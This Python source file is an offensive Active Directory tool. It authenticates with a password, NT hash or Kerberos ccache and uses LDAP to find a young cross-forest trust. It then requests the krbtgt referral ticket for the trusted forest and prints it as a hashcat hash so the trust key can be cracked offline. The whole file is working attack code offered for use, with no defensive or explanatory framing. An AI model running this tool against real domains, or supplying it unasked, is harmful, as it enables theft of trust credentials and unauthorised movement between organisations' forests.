#!/usr/bin/env python3
import argparse
import sys
import socket
import warnings
from datetime import datetime, timezone, timedelta

warnings.filterwarnings("ignore")

from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, TGS_REP, KRB_ERROR, \
    seq_set, seq_set_iter, Authenticator
from impacket.krb5.crypto import Key
from impacket.krb5.ccache import CCache
from pyasn1.type.univ import noValue
from pyasn1.codec.der import decoder, encoder

try:
    from ldap3 import Server, Connection, NTLM, ALL, SUBTREE
    LDAP_AVAILABLE = True
except ImportError:
    LDAP_AVAILABLE = False

# Trust Attribute Flags
TRUST_ATTRIBUTE_WITHIN_FOREST = 0x20
TRUST_ATTRIBUTE_FOREST_TRANSITIVE = 0x8


class TrustValidator:
    def __init__(self, domain, user, password=None, nthash=None, dc_ip=None):
        self.domain = domain
        self.user = user
        self.password = password
        self.nthash = nthash
        self.dc_ip = dc_ip
        self.conn = None

    def connect(self):
        target = self.dc_ip if self.dc_ip else self.domain
        server = Server(target, get_info=ALL, use_ssl=False)
        
        if self.nthash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{self.nthash}"
            self.conn = Connection(server, user=f"{self.domain}\\{self.user}", 
                                   password=ntlm_hash, authentication=NTLM)
        else:
            self.conn = Connection(server, user=f"{self.domain}\\{self.user}", 
                                   password=self.password, authentication=NTLM)
        
        if not self.conn.bind():
            raise Exception(f"LDAP bind failed: {self.conn.result}")
        return True

    def get_domain_dn(self):
        parts = self.domain.upper().split('.')
        return ','.join([f"DC={p}" for p in parts])

    def check_trust(self, target_domain):
        """
        Returns: (exists, is_intra_forest, days_since_creation, trust_direction)
        """
        base_dn = f"CN=System,{self.get_domain_dn()}"
        search_filter = f"(&(objectClass=trustedDomain)(name={target_domain}))"
        
        self.conn.search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=['trustAttributes', 'whenCreated', 'trustDirection', 'name']
        )
        
        if not self.conn.entries:
            return None, None, None, None
        
        entry = self.conn.entries[0]
        
        # Trust Attributes
        trust_attrs = int(entry.trustAttributes.value) if entry.trustAttributes.value else 0
        is_intra_forest = bool(trust_attrs & TRUST_ATTRIBUTE_WITHIN_FOREST)
        
        # Trust Direction (1=Inbound, 2=Outbound, 3=Bidirectional)
        trust_direction = int(entry.trustDirection.value) if entry.trustDirection.value else 0
        
        # When Created
        when_created = entry.whenCreated.value
        if when_created:
            if isinstance(when_created, str):
                when_created = datetime.strptime(when_created, "%Y%m%d%H%M%S.0Z")
            days_since = (datetime.now(timezone.utc) - when_created.replace(tzinfo=timezone.utc)).days
        else:
            days_since = None
        
        return True, is_intra_forest, days_since, trust_direction

    def close(self):
        if self.conn:
            self.conn.unbind()


class TrustKeyCracker:
    def __init__(self, domain, user, password=None, nthash=None, dc_ip=None, ccache=None):
        self.domain = domain.upper()
        self.user = user
        self.password = password
        self.nthash = nthash
        self.dc_ip = dc_ip
        self.ccache = ccache
        self.tgt = None
        self.cipher = None
        self.sessionKey = None

    def get_tgt(self):
        if self.ccache:
            return self._load_tgt_from_ccache()

        user_principal = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        lmhash = ''
        nthash = ''
        if self.nthash:
            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            nthash = self.nthash

        self.tgt, self.cipher, _, self.sessionKey = getKerberosTGT(
            user_principal, self.password or '', self.domain,
            lmhash=lmhash, nthash=nthash, kdcHost=self.dc_ip
        )
        return True

    def _load_tgt_from_ccache(self):
        ccache = CCache.loadFile(self.ccache)

        principal = ccache.principal
        self.user = principal.components[0]['data'].decode('utf-8')

        creds = ccache.getCredential('krbtgt/%s@%s' % (self.domain, self.domain))
        if creds is None:
            creds = ccache.getCredential('krbtgt/%s' % self.domain)
        if creds is None:
            for cred in ccache.credentials:
                server = cred['server']
                sname = '/'.join([c['data'].decode('utf-8') for c in server.components])
                if sname.lower().startswith('krbtgt/'):
                    creds = cred
                    break

        if creds is None:
            raise Exception("No TGT found in ccache")

        self.tgt = creds.toTGT()
        self.cipher = creds['key']['keytype']
        from impacket.krb5.crypto import _enctype_table
        self.cipher = _enctype_table[int(self.cipher)]

        from impacket.krb5.crypto import Key as CryptoKey
        self.sessionKey = CryptoKey(int(creds['key']['keytype']), bytes(creds['key']['keyvalue']))

        self.tgt = creds.toTGT()['KDC_REP']

        return True

    def build_tgs_req(self, target_spn):
        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        req_body = tgs_req['req-body']
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)
        req_body['realm'] = self.domain

        spn_principal = Principal(target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(req_body, 'sname', spn_principal.components_to_asn1)

        req_body['till'] = KerberosTime.to_asn1(datetime(2037, 12, 31, 23, 59, 59))
        req_body['nonce'] = 12345678

        seq_set_iter(req_body, 'etype', (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        ))

        ap_req = self._build_ap_req()
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = encoder.encode(ap_req)

        return encoder.encode(tgs_req)

    def _build_ap_req(self):
        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags([])

        decoded_tgt = decoder.decode(self.tgt, asn1Spec=AS_REP())[0]
        ap_req['ticket'] = noValue
        ap_req['ticket']['tkt-vno'] = decoded_tgt['ticket']['tkt-vno']
        ap_req['ticket']['realm'] = decoded_tgt['ticket']['realm']
        ap_req['ticket']['sname'] = decoded_tgt['ticket']['sname']
        ap_req['ticket']['enc-part'] = decoded_tgt['ticket']['enc-part']

        now = datetime.now(timezone.utc)
        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = self.domain

        cname = decoded_tgt['cname']
        authenticator['cname'] = noValue
        authenticator['cname']['name-type'] = cname['name-type']
        authenticator['cname']['name-string'] = noValue
        authenticator['cname']['name-string'][0] = cname['name-string'][0]

        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encoded_auth = encoder.encode(authenticator)
        encryption_key = Key(self.cipher.enctype, self.sessionKey.contents)
        encrypted_auth = self.cipher.encrypt(encryption_key, 7, encoded_auth, None)

        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = self.cipher.enctype
        ap_req['authenticator']['cipher'] = encrypted_auth

        return ap_req

    def send_raw(self, data):
        target = self.dc_ip if self.dc_ip else self.domain

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, 88))
            sock.send(len(data).to_bytes(4, 'big') + data)
            response_len = int.from_bytes(sock.recv(4), 'big')
            response = b''
            while len(response) < response_len:
                response += sock.recv(response_len - len(response))
            sock.close()
            return response
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            sock.sendto(data, (target, 88))
            response, _ = sock.recvfrom(65535)
            sock.close()
            return response

    def request_referral(self, target_spn):
        tgs_req = self.build_tgs_req(target_spn)
        response = self.send_raw(tgs_req)
        return self.parse_response(response)

    def parse_response(self, response):
        try:
            tgs_rep = decoder.decode(response, asn1Spec=TGS_REP())[0]
            ticket = tgs_rep['ticket']
            sname = '/'.join([str(s) for s in ticket['sname']['name-string']])
            realm = str(ticket['realm'])
            etype = int(ticket['enc-part']['etype'])
            cipher = bytes(ticket['enc-part']['cipher'])

            return {
                'type': 'TGS-REP',
                'service': sname,
                'realm': realm,
                'etype': etype,
                'cipher': cipher,
                'is_referral': sname.lower().startswith('krbtgt/')
            }
        except:
            pass

        try:
            krb_error = decoder.decode(response, asn1Spec=KRB_ERROR())[0]
            return {
                'type': 'KRB-ERROR',
                'error_code': int(krb_error['error-code']),
                'error_msg': constants.ERROR_CODES.get(int(krb_error['error-code']), 'Unknown')
            }
        except:
            pass

        return {'type': 'UNKNOWN', 'raw': response.hex()}

    def to_hashcat(self, ticket_info):
        etype = ticket_info['etype']
        cipher = ticket_info['cipher']
        service = ticket_info['service']
        realm = ticket_info['realm']
        cipher_hex = cipher.hex()

        if etype == 23:
            return f"$krb5tgs$23$*{self.user}${realm}${service}*${cipher_hex[:32]}${cipher_hex[32:]}"
        elif etype == 17:
            return f"$krb5tgs$17${realm}${self.user}$*{service}*${cipher_hex[-24:]}${cipher_hex[:-24]}"
        elif etype == 18:
            return f"$krb5tgs$18${realm}${self.user}$*{service}*${cipher_hex[-24:]}${cipher_hex[:-24]}"
        return f"# Unsupported etype {etype}"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("identity", help="domain/user:password or domain/user")
    parser.add_argument("-target", dest="target_domain", required=True)
    parser.add_argument("-dc-ip", dest="dc_ip")
    parser.add_argument("-hashes", dest="hashes", help="LMHASH:NTHASH")
    parser.add_argument("-k", action="store_true", help="Use Kerberos ccache (KRB5CCNAME)")
    parser.add_argument("-ccache", dest="ccache", help="Path to ccache file")
    parser.add_argument("-no-check", dest="no_check", action="store_true", help="Skip LDAP trust validation")
    parser.add_argument("-o", "--output")
    args = parser.parse_args()

    try:
        parts = args.identity.split('/')
        domain = parts[0]
        user_part = parts[1]
        if ':' in user_part:
            user, password = user_part.split(':', 1)
        else:
            user = user_part
            password = None
    except:
        print("[!] Invalid identity format. Use: domain/user:password or domain/user")
        sys.exit(1)

    nthash = None
    if args.hashes:
        try:
            nthash = args.hashes.split(':')[1]
        except:
            nthash = args.hashes

    ccache = None
    if args.ccache:
        ccache = args.ccache
    elif args.k:
        import os
        ccache = os.environ.get('KRB5CCNAME')
        if not ccache:
            print("[!] KRB5CCNAME environment variable not set")
            sys.exit(1)

    # LDAP Trust Validation
    if not args.no_check and not ccache:
        if not LDAP_AVAILABLE:
            print("[!] ldap3 not installed. Use -no-check to skip or: pip install ldap3")
            sys.exit(1)
        
        validator = TrustValidator(domain, user, password=password, nthash=nthash, dc_ip=args.dc_ip)
        try:
            validator.connect()
            exists, is_intra, days, direction = validator.check_trust(args.target_domain)
            validator.close()
            
            if not exists:
                print(f"[!] No trust relationship with {args.target_domain}")
                sys.exit(1)
            
            if is_intra:
                print(f"[!] {args.target_domain} is in the same forest - intra-forest trust keys cannot be cracked offline")
                sys.exit(1)
            
            if days is not None and days > 30:
                print(f"[!] Trust created {days} days ago - password was auto-rotated by DC, cannot crack")
                sys.exit(1)
            
            # Direction check (need outbound or bidirectional)
            if direction == 1:  # Inbound only
                print(f"[!] Trust is inbound-only - no referral ticket available from this domain")
                sys.exit(1)
            
            if days is not None:
                print(f"[*] Cross-forest trust to {args.target_domain} (created {days} days ago)")
            else:
                print(f"[*] Cross-forest trust to {args.target_domain}")
                
        except Exception as e:
            print(f"[!] LDAP trust check failed: {e}")
            print("[*] Continuing without validation (use -no-check to suppress)")

    cracker = TrustKeyCracker(domain, user, password=password, nthash=nthash, dc_ip=args.dc_ip, ccache=ccache)

    try:
        cracker.get_tgt()
    except FileNotFoundError:
        print(f"[!] Ccache file not found: {ccache}")
        sys.exit(1)
    except Exception as e:
        err_str = str(e)
        if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in err_str:
            print(f"[!] User not found: {user}@{domain}")
        elif 'KDC_ERR_PREAUTH_FAILED' in err_str:
            print(f"[!] Invalid password or hash for {user}@{domain}")
        elif 'KDC_ERR_CLIENT_REVOKED' in err_str:
            print(f"[!] Account disabled or locked: {user}@{domain}")
        elif 'No TGT found' in err_str:
            print(f"[!] No valid TGT found in ccache for {domain}")
        elif 'getaddrinfo failed' in err_str or 'Name or service not known' in err_str:
            print(f"[!] Cannot resolve DC for {domain}. Use -dc-ip option")
        elif 'Connection refused' in err_str or 'timed out' in err_str:
            print(f"[!] Cannot connect to KDC: {args.dc_ip or domain}")
        else:
            print(f"[!] Failed to get TGT: {e}")
        sys.exit(1)

    target_spn = f"krbtgt/{args.target_domain.upper()}"
    
    try:
        result = cracker.request_referral(target_spn)
    except Exception as e:
        print(f"[!] Failed to send TGS-REQ: {e}")
        sys.exit(1)

    if result['type'] == 'TGS-REP':
        hashcat_hash = cracker.to_hashcat(result)
        print(f"[+] Got referral ticket for {target_spn}")
        print(hashcat_hash)

        if args.output:
            with open(args.output, 'w') as f:
                f.write(hashcat_hash + '\n')
            print(f"[+] Hash saved to {args.output}")
    elif result['type'] == 'KRB-ERROR':
        error_code = result['error_code']
        if error_code == 7:  # KDC_ERR_S_PRINCIPAL_UNKNOWN
            print(f"[!] No trust relationship with {args.target_domain}")
        elif error_code == 12:  # KDC_ERR_POLICY
            print(f"[!] Trust policy denied request to {args.target_domain}")
        else:
            print(f"[!] KRB-ERROR {error_code}: {result['error_msg']}")
        sys.exit(1)
    else:
        print(f"[!] Unexpected response from KDC")
        sys.exit(1)


if __name__ == "__main__":
    main()
